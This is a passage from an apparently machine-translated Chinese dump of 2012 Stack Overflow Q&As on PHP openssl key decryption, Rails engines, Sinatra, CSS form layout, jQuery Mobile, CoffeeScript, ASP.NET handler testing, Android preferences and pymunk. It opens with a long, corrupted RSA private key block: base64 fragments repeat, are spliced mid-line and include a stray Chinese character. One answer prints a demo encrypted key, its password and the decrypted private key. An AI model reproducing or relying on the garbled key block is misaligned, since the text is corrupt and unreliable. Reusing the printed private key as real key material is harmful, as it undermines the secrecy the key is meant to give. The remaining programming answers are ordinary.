aWr5pwKBgGngeK3PyoXvOZNZ5f9r3i4C3d7UHz9Aiwn2Ulh138dp1AW8d4a9AiTZ RBd9pQGsIsSzhPkTZ65Mx + R6X + V / xfnFjnShronfeNdkpkgACbgQvJTDbg8Asu9x ifwaEKu8 + t1MqrmPh5vKY6Fhl2DdPkk2evp6eG1t1IO6pAkYb8L56g8rZ01CmmiC + WzuW0lVWpaNIi4luKsA6B2fiIjY4Xh46qkddYuwVUxLM3xym7Yo eoFfUu4kiTKGJdTMAkReIn + tqPTg9LwvvHSNH2GMp8 / TjmxbQd + x9QVyGKNnTsLY aYrbcK7rh9fbvZsywNLeYrrt / VrmArpt2FMqPA8CgYBTm / D7WKU7oUREAYNIZ13B k3zvRaXCpnSp0ZNHbNbqCZnHiy0vSVa0kW / Q + TG / zGHJCiwKM3UvnUMgxkFNa4CT的di / sHW84xgTGUPBxDDCRQ8XkI2thfHSFFQas9wPrZR + 1MPVzH4RpYwSVVYvpSviX eIbY59CMiPitH0Q0N6UkgwKBgQCktsHJ48zCKGu8X3I11DAxYy6kl1mPgt3Zhwpm O + cMb2B2QEFsGLar0vxztA6IUUQnZp4YolAmSBX6Y0qLXgyFUDzcvxygKABmHcCV rogsUatkUcvUCSFa41xx21A8OxKTLz2iRHEhsKo3aR1FQW4nowTIlv0RIrXqnZ8F aWr5pwKBgGngeK3PyoXvOZNZ5f9r3i4C3d7UHz9Aiwn2Ulh138dp1AW8d4a9AiTZ RBd9pQGsIsSzhPkTZ65Mx + R6X + V / xfnFjnShronfeNdkpkgACbgQvJTDbg8Asu9x ifwaEKu8 + t1MqrmPh5vKY6Fhl2DdPkk2evp6eG1t1IO6pAkYb8L56g8rZ01CmmiC + WzuW0lVWpaNIi4luKsA6B2fiIjY4Xh46qkddYuwVUxLM3xym7Yo eoFfUu4kiTKGJdTMAkReIn + tqPTg9LwvvHSNH2GMp8 / TjmxbQd + x9QVyGKNnTsLY aYrbcK7rh9fbvZsywNLeYrrt / VrmArpt2FMqPA8CgYBTm / D7WKU7oUREAYNIZ13B k3zvRaXCpnSp0ZNHbNbqCZnHiy0vSVa0kW / Q + TG / zGHJCiwKM3UvnUMgxkFNa4CT的di / sHW84xgTGUPBxDDCRQ8XkI2thfHSFFQas9wPrZR + 1MPVzH4RpYwSVVYvpSviX eIbY59CMiPitH0Q0N6UkgwKBgQCktsHJ48zCKGu8X3I11DAxYy6kl1mPgt3Zhwpm O + cMb2B2QEFsGLar0vxztA6IUUQnZp4YolAmSBX6Y0qLXgyFUDzcvxygKABmHcCV rogsUatkUcvUCSFa41xx21A8OxKTLz2iRHEhsKo3aR1FQW4nowTIlv0RIrXqnZ8F aWr5pwKBgGngeK3PyoXvOZNZ5f9r3i4C3d7UHz9Aiwn2Ulh138dp1AW8d4a9AiTZ RBd9pQGsIsSzhPkTZ65Mx + R6X + V / xfnFjnShronfeNdkpkgACbgQvJTDbg8Asu9x ifwaEKu8 + t1MqrmPh5vKY6Fhl2DdPkk2evp6eG1t1IO6pAkYb8L5aYrbcK7rh9fbvZsywNLeYrrt / VrmArpt2FMqPA8CgYBTm / D7WKU7oUREAYNIZ13B k3zvRaXCpnSp0ZNHbNbqCZnHiy0vSVa0kW / Q + TG / zGHJCiwKM3UvnUMgxkFNa4CT的di / sHW84xgTGUPBxDDCRQ8XkI2thfHSFFQas9wPrZR + 1MPVzH4RpYwSVVYvpSviX eIbY59CMiPitH0Q0N6UkgwKBgQCktsHJ48zCKGu8X3I11DAxYy6kl1mPgt3Zhwpm O + cMb2B2QEFsGLar0vxztA6IUUQnZp4YolAmSBX6Y0qLXgyFUDzcvxygKABmHcCV rogsUatkUcvUCSFa41xx21A8OxKTLz2iRHEhsKo3aR1FQW4nowTIlv0RIrXqnZ8F aWr5pwKBgGngeK3PyoXvOZNZ5f9r3i4C3d7UHz9Aiwn2Ulh138dp1AW8d4a9AiTZ RBd9pQGsIsSzhPkTZ65Mx + R6X + V / xfnFjnShronfeNdkpkgACbgQvJTDbg8Asu9x ifwaEKu8 + t1MqrmPh5vKY6Fhl2DdPkk2evp6eG1t1IO6pAkYb8L5aYrbcK7rh9fbvZsywNLeYrrt / VrmArpt2FMqPA8CgYBTm / D7WKU7oUREAYNIZ13B k3zvRaXCpnSp0ZNHbNbqCZnHiy0vSVa0kW / Q + TG / zGHJCiwKM3UvnUMgxkFNa4CT的di / sHW84xgTGUPBxDDCRQ8XkI2thfHSFFQas9wPrZR + 1MPVzH4RpYwSVVYvpSviX eIbY59CMiPitH0Q0N6UkgwKBgQCktsHJ48zCKGu8X3I11DAxYy6kl1mPgt3Zhwpm O + cMb2B2QEFsGLar0vxztA6IUUQnZp4YolAmSBX6Y0qLXgyFUDzcvxygKABmHcCV rogsUatkUcvUCSFa41xx21A8OxKTLz2iRHEhsKo3aR1FQW4nowTIlv0RIrXqnZ8F aWr5pwKBgGngeK3PyoXvOZNZ5f9r3i4C3d7UHz9Aiwn2Ulh138dp1AW8d4a9AiTZ RBd9pQGsIsSzhPkTZ65Mx + R6X + V / xfnFjnShronfeNdkpkgACbgQvJTDbg8Asu9x ifwaEKu8 + t1MqrmPh5vKY6Fhl2DdPkk2evp6eG1t1IO6pAkYb8L5rogsUatkUcvUCSFa41xx21A8OxKTLz2iRHEhsKo3aR1FQW4nowTIlv0RIrXqnZ8F aWr5pwKBgGngeK3PyoXvOZNZ5f9r3i4C3d7UHz9Aiwn2Ulh138dp1AW8d4a9AiTZ RBd9pQGsIsSzhPkTZ65Mx + R6X + V / xfnFjnShronfeNdkpkgACbgQvJTDbg8Asu9x ifwaEKu8 + t1MqrmPh5vKY6Fhl2DdPkk2evp6eG1t1IO6pAkYb8L5rogsUatkUcvUCSFa41xx21A8OxKTLz2iRHEhsKo3aR1FQW4nowTIlv0RIrXqnZ8F aWr5pwKBgGngeK3PyoXvOZNZ5f9r3i4C3d7UHz9Aiwn2Ulh138dp1AW8d4a9AiTZ RBd9pQGsIsSzhPkTZ65Mx + R6X + V / xfnFjnShronfeNdkpkgACbgQvJTDbg8Asu9x ifwaEKu8 + t1MqrmPh5vKY6Fhl2DdPkk2evp6eG1t1IO6pAkYb8L5
> > 
> > -----结束 RSA 私钥-----

* * *

总而言之，我想我想说的是我不知道如何检索 openssl_pkey_get_private() 应该返回的解密私钥。它没有返回**FALSE**，所以它必须工作......我只是不知道它放在哪里。

任何帮助将不胜感激，因为我非常卡住！

非常感谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-14T16:02:58.957

我希望这就是你所追求的。

```
$privKey = openssl_pkey_new($config); //retrieve priv key resource
openssl_pkey_export($privKey, $pkeyout); //obtained unencrypted private key.
var_dump($pkeyout); //print results 
```

新生成的密钥还没有密码，因此您可以立即获得未加密的密钥。

**编辑**

根据评论，我生成了自己的密钥对

```
openssl genrsa -des3 -out privkey.pem 2048 
```

然后，我能够使用以下内容转储未加密的私钥：

```
$r = openssl_pkey_get_private('file://privkey.pem', 'temp123');
openssl_pkey_export($r, $pkeyout);
var_dump($pkeyout); 
```

您可以提供密钥而不是文件名，只要它是 PEM 格式的。

**编辑 2**

我无法让您提供的密钥与您在问题中包含的密码一起使用，但它确实可以与我生成的临时密钥一起使用。

我使用的确切代码如下：

```
$k = <<<EOF
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,878E66CD01D1A379

RIAnkFVcUEfLXqopP/ywpF0yeYWE2LijOmWuGBRgXup/cIA42jrXuRF+WBR5Ni+2
8IWnbiMh9tseTYpAcAp32JeCvlNqes65qEh93qVLKU6K4uYg/rh170hdrUd6DL7R
mLrXWm3ciBCatxancok6uJcP1FksWrdjpR8z9thKAGXWOIVxvudBgK0Fpf/FtmJA
A5x84Zb8FiN+cyJyvYrQm89v9Une+7kA7x6T8Q/QSDvG1ik5efJAFg2vBqo6Jlht
nJjwDQKtTn7tpUANY7Y/aMoEllkEPOM4MFc3r9g59rGq16BTbhBMmI3TUkg0p2nx
tIOq1N568RYh8OVGtaHu5HJ0W7LKmtqhgvSj70i+ed4wOJotQ+OXCfS6SWQKrS4o
jLFNuH6K7uzO4GGnacSupFtyO29UiCYmV0LQpLCg599ffjuHI+iFBj1JeRrEDc4W
z+6jc4gnLdgAJVoTUD0skx3VinXrjf5q5/ctZOOWCHSFV3BeuatfuGj8w/oKM9Y2
ppYcI5uyA07+a0mVmSvpJIJMcAf8FlIRf3HfTkjkyaCD8h1SbDtaBSdlkKRZHqUX
f7jSe58MqwYZiLRcX0mYxZfv9oVDzT4AgIiTwFF33zQriBSer/TI57WLV+PZ3j9y
lolXdK6pkAPkMnJSbpcf0RcXvDrY646J5pxgylGgn/A1mgD1btmJSVBbcb75Wy3e
Heir6+VaQ/V/j8U9nZfNkGqnEv3TwGhj8u010tgeG/lfxA3eQMw04WlRac37GlRr
IrEbpOW88JZIknvY1w8/c+uzGDIRL8ucUkL1s5j626Z8UxN7KTuuXaWNdenPGzx/
pgAwNlkhS+f4uUajYDEbgy7o1v7L1K0xRDglqTTXmycr82mMTNZR0r/KRt7dlDI1
ZM/7BIT0iRsm+16ZBF/R9i0S3uu4ox87cBfaIOlo9h73tYM/6RMJ0NfsPJtSzzM+
dRZRuyNImA8PDQG2yTmIhOmDQbnzywBsNfWfFX+8SJtAHPnENMvdwkWrDgaVSvPK
K4PzRLqKG3oU9CdXk+y2fFxumFeMUbupLh/AgQWiVsEdA1Igz7jQ2iIrC8BB0Jy6
igOMn9Db/o/fJ4QMe0IIdw4ZIqhVt0IIt50ElZHd8ASLpQxhggXtafpcO/fn0Rpx
ZJ7hWff9hIGbGQtf5i3fy8RUjUpplPYkleQCQls6Dss5c31vTX4evEAWzfKLe0eA
Cuq1uTJ8aB13cRbcHTmR0i8GLiE/93U2oB+hPVCeZEWtPAaqOyVIsU8uD7/2xNa2
C73gtJ3N3Kr8SR5QSB3aRZEA1uxAbtvNRUl9Vo8ECw+S2l0iGmrzXtVY1+4sGu9K
57+kobM58y1eNuwyCuv8uryCoA2CdMBGwKZn2XgLPda7RBIfY52u7R/oM3Pm2JbT
iVL2PxeTCSuH/Z3FKbRdTQ/0+IvR/Xd70rnTTkQD6TdMa53UEg3xnftOfZr9JrWw
/mYvYAQdgwARddTlG2sS7dMG0erHlVzN+kKSC8CGEVgHMNpyjWdFT7rwksC4s85c
iJ/BIYymy2sCpr/YnzT2blE1hFCrLbyc1FuBh+SDr9jtnVvErndlMg==
-----END RSA PRIVATE KEY-----
EOF;

$r = openssl_pkey_get_private($k, 'temp123');
openssl_pkey_export($r, $pkeyout);
var_dump($pkeyout); 
```

输出是：

```
string(1675) "-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAtAOvzSslm7QPNRRZgHC9zAbl/f1U1Ni5vmHqazmNaSvM+Wwq
ZbbeFtBfnSB13Q9aBt7oEFjaS7yhmBcdy9/JkzO7eOpxQOFNaHpXf8a95Qlhpt7x
S++4VXzX2RB2ja0xBLacggXz6puRaaH4zwsxTKzeyzdfochovpj1JMRNHJYj5Hi7
EJy3gxL6Lmi5PMir0cu/J86Ls0tcRMJjSdtWH9Ut9TQNhn6wyrHm4mM7SL+j5eBZ
mZlRRAb/Is3r+/mn23UNUEMcVpi7FHi2jgVwrEToWZugWcdQOnQFBkAFSaEZFvO9
OmctbiNZY1ZvB3mDyZIzVGHBpdPNNaYpZg3q2QIDAQABAoIBAD6E3USrTId0FKgB
pkf2X+SBLNV2a0T09CWLyidtOJCjNrAVgfALf7x6qAphIK4iy8iBGCW9RitxmsnA
lYed9FscZ2rKOYUn+oNjogntkzv9cx3KZhFSczm1fx2TGyl/UfvqFBcQTDNZzjna
mBgIMhoIG+SGGb+NY9t2MgWP65wWb6vJgQTw7NeaZguA6gGfvsdI/VSv2xHvHe2Q
MiVIQxfBoOPOs9mCOJJMSsfDogo0JE7MehV+D2mx5ZA3uJLN+0cvvYO48SvdJwXB
fp3lmT+XbXSDJ/KB/AxgONgl3lb4clr46pXkdWWBfwTMJmOGcLLvaBjniZGUBOeW
3v8RWoECgYEA313cXyxc2WWJiaXJqnPC/+L9AVpYZYJZEt2T8D4uffJJUe61k3Vu
G4UlGaeCpRakfWr7QuKyPOsWyDsXrTXivftGnlflFGAiAV+ssfs1YdjnwHWIJ3Xg
fSyVPyQCZprDtCzrHKlUCYh4uyuUP9X9B6iSdFCDczLEYb8hIPgu9dECgYEAzlBo
dG2f7u93FoLlmzxPU2HnZlu/xtyCwo0phr7Z+cX+2D3KWAHnEYDtE+hOX7cxg/UF
RMLkApFz3H962bu5eFIsMtkd/XigD4ByNxSr9rKxsKisEg9UCnFwiR8jCXeCCjYP
/OjFAH2yk0J2zYOa091sin94G6qjSGAyPwNX/okCgYEAo0rz+yPscQXY6aco6hKd
AQLJYb7RlswXIEKaj2x2Ap8o2NwBJF8Z8saAm+OpD9WgxQt7yqb+FKjsy87ffUJC
lA7pzoKFN0McORLfpnH20aSHsFx8ABUd24THSxShKK+F2Odprldf12RMltDCHXTr
+ThUcPIXVxVLGgZnSroFYrECgYA+x0zhkLIH3KoaGX6QfAuPTc1B4k06z8KiPJ4U
OGLPlCX12ueFXB7ZvqdlVVzz1ySkCJyvzbXf6i6dO9VAB9Vp/Wchmdt8U4Yw8V7P
z+R7zugu30RswmlKPDaIIwdgTBMv1D+NL68ydQ0vrhvEcXVdXpU2l48OrB+/WDYx
4myWMQKBgGFVuEOb4yKHTeQo5R/+gRsyrDIE0Xzq5t3WZjssjeju5q5c6Fp24qDb
jq8SNkLXOMsATc9iLnYKeZa2EXR2w548LmY2L+TGk/XT2eZrFY0NImaDIPwS7KFq
keO8GceLlhXU3wgDSb6NWkuCxDJrYJqhGVFHmuI7/Ntll2o4eVuD
-----END RSA PRIVATE KEY-----
" 
```

# ruby-on-rails - Rails：尝试将模型分离为引擎 gem

> ID：11955450
> 
> 赞同：0
> 
> 时间：2012-08-14T15:13:52.620
> 
> 标签：ruby-on-rails, gem, ruby-on-rails-plugins, rails-models

我是 Rails 的新手，所以请原谅我的愚蠢。

我正在尝试做一些非常简单的事情，并且无法找到最新的指南并正确演示如何执行此操作。

我已经编写了官方 ruby​​ on rails 教程中描述的应用程序：http: [//edgeguides.rubyonrails.org/getting_started.html](http://edgeguides.rubyonrails.org/getting_started.html)

现在我想拿一个模型，说标签，然后用它做一个宝石。我将如何实现这一目标？我读过一些关于 rails Engines 的文章，但无法真正弄清楚生成器会在哪里以及大部分情况下会是什么样子。

我现在希望能够编写另一个应用程序，例如 flickr 样式的东西，并将新的 Tags gem 添加到 Gemfile 并拥有一个

```
:has_many tags 
```

在图片模型中，我为所有图片添加了标签机制。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:16:25.763

欢迎！很高兴您喜欢入门指南，然后我将引导您使用（尚未发布的）[引擎指南](http://edgeguides.rubyonrails.org/engines.html)。

# sinatra - 具有不同配置的多个 Sinatra::Base 应用程序实例

> ID：11955455
> 
> 赞同：0
> 
> 时间：2012-08-14T15:14:02.000
> 
> 标签：sinatra, rack

我开发了一个基于`Sinatra::Base`. 现在我想在单个 Rack 应用程序中使用它的许多实例，每个实例的配置略有不同。

我`rackup`应该看起来像

```
use Rack::Lint

map '/mel' do
    run Site.new('/home/mel/site').app
end

map '/pub' do
    run Site.new('/pub').app
end 
```

该类`Site`收集各种参数（在这个例子中只有根目录）并做一些准备工作。该`#app`方法应返回一个`Server`包含对所服务`Site`实例的引用的对象。

这是`Site`和`Server`代码的示例：

```
class Site
    def initialize(root_dir)
        @root_dir = root_dir
        # ... set up things ...
    end

    def app
        # This is where a new Server Rack application should be created
        return Server.new { |server| server.set :site, self }
    end
end

class Server < Sinatra::Base
    before do
        @content = settings.site.all_files
    end

    get /(.*)/ do |url_path|
        # do things...
    end
end 
```

这段代码的问题是该`#app`方法没有返回有效的 Rack 应用程序。

我应该怎么做`#app`才能返回一个新的、已配置的`Server`Rack 应用程序？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:37:03.153

这是#sinatra 上的“carloslopes”建议的一种使其工作的方法。

方法`Site#app`变成

```
class Site
    def app
        # This is where a new Server object should be created
        return Server.new(self)
    end
end 
```

`Server`对象通过实例变量获取参数：

```
class Server < Sinatra::Base
    def initialize(site)
        super()
        @site = site
    end

    before do
        @content = @site.all_files
    end

    get /(.*)/ do |url_path|
        # do things...
    end
end 
```

**编辑**：制作社区 wiki，以便其他人可以使解决方案变得更好并分享功劳。

# php - CSS/HTML 内联和居中两个单独表单的表单按钮

> ID：11955456
> 
> 赞同：1
> 
> 时间：2012-08-14T15:14:05.233
> 
> 标签：php, html, css

我正在尝试显示两个表单按钮（每个都属于一个单独的表单）内联和居中（水平）。
这是我的代码：

```
<div>

<?php
    if(($id && $upperConvLim) || ($id && !$upperConvLim && !$lowerConvLim)){
?>

    <span> &nbsp;&nbsp;&nbsp; </span>
    <form method="post" action="index.php" class="previous">
        <input type="submit" value="Previous" name="submit1" />
        <?php echo '<input type = "hidden" value="'.$id.'"name = "id" />'; ?>
        <?php echo '<input type = "hidden" value="'.$previous.'"name = "previous" />'; ?    >
    </form>

<?php
    }
    if(($id && $lowerConvLim) || ($id && !$upperConvLim && !$lowerConvLim)){
?>

    <span> &nbsp;&nbsp;&nbsp; </span>
    <form method="post" action="index.php" class="next">
        <input type="submit" value="Next" name="submit2" />
        <?php echo '<input type = "hidden" value="'.$id.'"name = "id" />'; ?>
        <?php echo '<input type = "hidden" value="'.$next.'"name = "next" />'; ?>
    </form>

<?php
    }
?>  

</div> 
```

我尝试在我的 CSS 中使用以下内容内联它们，

```
form, form div {
    display: inline-block;
} 
```

这工作正常，但我无法将两个按钮居中。我想知道1）如何使两个按钮居中以及2）是否有更好的方法来内联它们。欣赏它。

编辑：按照 Cynthia 的建议，我将 php/html 代码更改为，

```
<div class="center-form">
<?php
if(($id && $upperConvLim) || ($id && !$upperConvLim && !$lowerConvLim)){
?>
<span> &nbsp;&nbsp;&nbsp; </span>

<form method="post" action="index.php" class="hform">
        <input type="submit" value="Previous" name="submit1" />
        <?php echo '<input type = "hidden" value="'.$id.'"name = "id" />'; ?>
        <?php echo '<input type = "hidden" value="'.$previous.'"name = "previous" />'; ?>
</form>

<?php
}

if(($id && $lowerConvLim) || ($id && !$upperConvLim && !$lowerConvLim)){
?>

<span> &nbsp;&nbsp;&nbsp; </span>

<form method="post" action="index.php" class="hform">
        <input type="submit" value="Next" name="submit2" />
        <?php echo '<input type = "hidden" value="'.$id.'"name = "id" />'; ?>
        <?php echo '<input type = "hidden" value="'.$next.'"name = "next" />'; ?>
</form>

<?php

}

?>
</div> 
```

还有我的新 CSS：

```
table {
font-family: Verdana;
font-size: 10pt
}

#table4 {
margin-left: auto;
margin-right: auto;
border:1px solid black;
width :70%;
padding:10px;
background-color:#FAFAD2;
}

#table3 {
margin-left: auto;
margin-right: auto;
border:1px solid black;
width :60%;
padding:10px;
background-color:#FFDAB9;
}

/*
form, form div {

  display: inline-block;
  text-align: center;
}
*/

.center-form { display:block ; width:165px ; margin:auto }

form.hform { display:inline }

input[type=submit] { padding:4px 0 ; width:80px } 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:19:46.860

给你：http: [//jsfiddle.net/myQtb/](http://jsfiddle.net/myQtb/)

简而言之：

这是缩写的 HTML 代码（我只使用了准系统表单）：

```
<div class="center-form">
<form class="hform">
<input type="submit" name="submit" value="Submit">
</form>

<form class="hform">
    <input type="submit" name="submit" value="Reset">
</form>
</div>​ 
```

这是CSS：

```
.center-form { display:block ; width:165px ; margin:auto }
form.hform { display:inline }
input[type=submit] { padding:4px 0 ; width:80px }​ 
```

为什么有效：

`inline-block`将您的表单标签样式从简单更改为`inline`. 然后将 BOTH 表单包含在与`.center-form`两个按钮的组合宽度一样宽的 DIV 中。分配`display:block`给`.center-form`DIV 并添加`margin:auto`（以便左/右边距将自动调整）。

瞧！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:17:59.863

这将使 div 或表单中的所有元素居中。

```
form, form div {
   text-align: center;
} 
```

# jquery-mobile - jquery mobile左侧菜单

> ID：11955458
> 
> 赞同：4
> 
> 时间：2012-08-14T15:14:08.383
> 
> 标签：jquery-mobile, menu

在整个 jQuery Mobile 文档中，他们使用左侧菜单进行导航，当浏览器宽度较小时，该菜单会更改为对移动设备更友好的版本。[您可以在此页面](http://jquerymobile.com/demos/1.1.1/docs/pages/page-anatomy.html)上看到一个示例。

他们在整个文档中都使用这种布局，我可以在源代码中看到他们使用了两个 ID 为“content-primary”和“content-secondary”的 div。我的问题与以下事实有关，即我找不到文档中实际讨论的有关此结构的任何信息。他们不会在框架中包含如此有用的小部件，这似乎很奇怪。他们是使用自定义代码来实现的，还是我在文档中以某种方式错过了它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T16:20:11.037

实际上这不是特定于jquery mobile，这是CSS3。您可以在此处查看文档：[http](http://www.css3.info/preview/media-queries/) ://www.css3.info/preview/media-queries/ 。本质上，他们所做的是使用媒体查询为不同的屏幕宽度指定样式规则，如下例所示：

```
@media all and (min-width: 650px) { // you can define your width here
  // style rules here
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-08T15:40:23.907

坦率地说，我很惊讶地发现找到一个在 JQM 中始终如一地工作且符合预期的左导航示例是多么具有挑战性。

我最终直接从 JQM 文档中复制代码，包括获取他们的自定义 .js 和 .css 脚本（它定义了`.content-primary`和`.content-secondary`类，以及`@media`使菜单响应的各种查询）。

JQM 文档不使用“多页”格式。相反，每个导航菜单项都链接到一个完全独立的 URL（可能是通过添加到链接预取到 DOM`data-prefetch="true"`中），因此每个新页面/URL 必须重新重新定义相同的导航菜单。

这立即让我的开发人员大脑想到“让我们抽象菜单并自动将其包含在每个页面上”。但是如何在没有 PHP（或其他服务器端语言）的情况下“包含”每个页面上的菜单？这是我还没有解决的问题。

您可以调用该`$(document).bind('pageinit',`函数以使用 javascript/jquery 手动将菜单注入加载页面，但我还没有弄清楚如何正确执行此操作。

如果/当我有一个可行的解决方案时，我会及时通知你。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-06T21:15:59.820

您是在谈论类似[http://jquerymobile.com/demos/1.3.0-beta.1/docs/demos/panels/panel-nav-form.html#](http://jquerymobile.com/demos/1.3.0-beta.1/docs/demos/panels/panel-nav-form.html#)的左侧菜单吗？没玩过，但看起来这些天只需要

```
<div data-role="panel" data-position="left" data-position-fixed="false" data-display="reveal"> 
```

# jquery - CoffeeScript jQuery 插件并尝试调用外部 jQuery 插件

> ID：11955461
> 
> 赞同：1
> 
> 时间：2012-08-14T15:14:13.207
> 
> 标签：jquery, jquery-plugins, coffeescript

我有以下（简单）CoffeeScript jQuery 插件：

```
$ = jQuery

$.fn.extend
    schoolSelect: (options) ->
        settings = 
            apiUrl: '/api/v1'
            debug: false

        settings = $.extend settings, options

        log  = (msg) ->
            console?.log msg if settings.debug

        return @each ->
            @.dropkick
                change: (val, label) ->
                    log val
                    log label 
```

我在另一个 CoffeeScript 文件中这样称呼它：

```
$('.school_select').schoolSelect
        debug: true 
```

但由于某种原因，我不断收到以下错误： `Uncaught TypeError: Object #<HTMLSelectElement> has no method 'dropkick'`

我正在`DropKick`为我的 HTML 选择使用 jQuery 插件：http: [//jamielottering.github.com/DropKick/](http://jamielottering.github.com/DropKick/)

如何在我的 CoffeeScript jQuery 插件中访问 DropKick 插件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T15:22:53.723

这一行：

```
 return @each ->
        @.dropkick 
```

需要是

```
 return @each ->
        $(@).dropkick 
```

在每个 jQuery 回调的上下文中，`this`为您返回一个原始 DOM 元素（因此有关 HTMLSelectElement 的警告），而不是一个 jQuery 对象。

如果您的插件正在调用另一个插件，您需要确保在扩展 jQuery 之前完成 DropKick 插件的设置。

# c# - 如何使用附加文件测试 ASP NET ashx 处理程序

> ID：11955462
> 
> 赞同：2
> 
> 时间：2012-08-14T15:14:12.520
> 
> 标签：c#, asp.net, ashx

我有一个检测附加文件的 c# ashx 处理程序。它工作正常。

但是，我依靠第三方公司编写软件将文件发送给处理程序（长话短说）。我需要测试我的处理程序是否有效，我们和第 3 方公司之间的时差正在成为一场噩梦。

场景是第 3 方软件每 30 秒向处理程序发送一次文件，我需要测试它的工作原理，而且听起来很愚蠢，我以为我问 stackoverflow :)

我只想使用测试单元或其他任何东西来测试我的 ashx 处理程序，但不知道从哪里开始。输入“handler.ashx?filename=12345.csv”很有帮助，但没有附加实际文件！

任何建议都会很棒。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T15:32:15.250

据我了解，您有一个 ashx 处理程序，您可以将文件上传到该处理程序并对其进行测试。

我附上了一个示例测试，该测试假定使用 POST 请求文件附件的 ashx 处理程序。

```
[TestMethod]
public void TestCallUploadHandler()
{
    const string FILE_PATH = "C:\\foo.txt";
    const string FILE_NAME = "foo.txt";
    string UPLOADER_URI =
        string.Format("http://www.foobar.com/handler.ashx?filename={0}", FILE_NAME);

    using (var stream = File.OpenRead(FILE_PATH))
    {
        var httpRequest = WebRequest.Create(UPLOADER_URI) as HttpWebRequest;
        httpRequest.Method = "POST";
        stream.Seek(0, SeekOrigin.Begin);
        stream.CopyTo(httpRequest.GetRequestStream());

        var httpResponse = httpRequest.GetResponse();
        StreamReader reader = new StreamReader(httpResponse.GetResponseStream());
        var responseString = reader.ReadToEnd();

        //Check the responsestring and see if all is ok
    }
} 
```

基本上你正在做的是为**POST**创建一个 WebRequest并将文件流附加到它的请求和文件名到它的查询字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T16:44:05.097

回答我的问题，非常感谢@parapura：

```
[TestMethod]
public void TestCallUploadHandler()
{
    const string FILE_PATH = "C:\\foo.txt";
    const string FILE_NAME = "foo.txt";
    string UPLOADER_URI = string.Format("http://www.foobar.com/handler.ashx?filename={0}", FILE_NAME);

    using (var stream = File.OpenRead(FILE_PATH))
    {
        var httpRequest = WebRequest.Create(UPLOADER_URI) as HttpWebRequest;
        httpRequest.Method = "POST";
        NetworkCredential networkCredential = new NetworkCredential("username", "pwd"); 
        httpRequest.Credentials = networkCredential;
        stream.Seek(0, SeekOrigin.Begin);
        stream.CopyTo(httpRequest.GetRequestStream());

        byte[] authBytes = Encoding.UTF8.GetBytes("username:pwd".ToCharArray());
        httpRequest.Headers["Authorization"] = "Basic " + Convert.ToBase64String(authBytes);

        var httpResponse = httpRequest.GetResponse();
        StreamReader reader = new StreamReader(httpResponse.GetResponseStream());
        var responseString = reader.ReadToEnd();

        //Check the responsestring and see if all is ok
    }
} 
```

# android - 具有共享偏好的自定义切换按钮

> ID：11955463
> 
> 赞同：0
> 
> 时间：2012-08-14T15:14:14.417
> 
> 标签：android, button, sharedpreferences, togglebutton

我正在尝试设置一个自定义切换按钮，我在其中使用 Imagebutton 和两个不同的图像来显示切换的状态。现在我可以切换图片监听点击：

```
togglebtn = (ImageButton) findViewById(R.id.togglebtn);
        togglebtn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                togglebtn.setImageResource(R.drawable.offbtn);
            }
        }); 
```

但我不确定如何使用 sharepreferences 保存用户选择的状态。我想使用布尔值，但我找到的所有使用布尔值的 shareprefences 示例都是特定于复选框而不是这样的。

如何保存切换按钮的状态？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:18:36.877

尝试类似的东西（编码出来的头脑）

```
editor = sharedPreferences.edit();

boolean b = true; 
editor.putBool("myBoolean", b);
editor.commit(); 
```

我建议您保存活动的 onPause() 而不是 onClick，因为我认为它很昂贵。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:20:45.097

从@Anthea 关于偏好的评论进一步，您不应该使用 ImageButton。

布尔选项实现有 ToggleButton、CheckBox 和 Switch。你应该检查它们。您也不应该以编程方式更改可绘制对象。您可以/应该设置一个选择器可绘制 XML 按下和未按下并将它们设置在布局上。

# python - 向 pymunk poly 添加点

> ID：11955464
> 
> 赞同：0
> 
> 时间：2012-08-14T15:14:15.483
> 
> 标签：python, chipmunk, pymunk

我在 Pymunk 中创建多边形时遇到了一些麻烦。

```
import pymunk
space = pymunk.Space()
space.gravity = (0.0, 900.0)

box_points=[(-100,-100), (100,-100), (100,100), (-100, 100)]
body = pymunk.Body(10.0, 1000.0)
body.position = pymunk.Vec2d(300.0,300.0)
shape = pymunk.Poly(body, box_points, (0,0))

space.add(body, shape)

print shape.get_points()

# Outputs: [Vec2d(300.0, 300.0), Vec2d(300.0, 300.0), Vec2d(300.0, 300.0), Vec2d(300.0, 300.0)] 
```

形状的顶点都在身体的中心！（即在 (0, 0) 处）。我认为他们不应该，还是我跳过了一些步骤？

我正在运行**Mac OS** 10.7.4 ，使用**Chipmunk v6.0.2**和**Pymunk 2.1.0** ..这是一个错误吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T11:05:42.543

看起来您偶然发现了花栗鼠中的 32 位编译错误。从 10.6 开始，Apple 更改了其头文件中的预定义定义，这仅在 OSX 上的 32 位 python 上创建了一个错误。好消息是它已经在最新的 pymunk svn 主干中修复了。

花栗鼠论坛的完整细节在这里：[http ://chipmunk-physics.net/forum/viewtopic.php?f=1&t=2265](http://chipmunk-physics.net/forum/viewtopic.php?f=1&t=2265)

get_points 应该返回世界坐标中的点，这意味着您的示例中的输出应该是：

```
[Vec2d(200.0, 400.0), Vec2d(400.0, 400.0), Vec2d(400.0, 200.0), Vec2d(200.0, 200.0)] 
```

（我希望尽快发布新版本的 pymunk。我目前正在转换为 sphinx 的文档，但大部分已经完成）

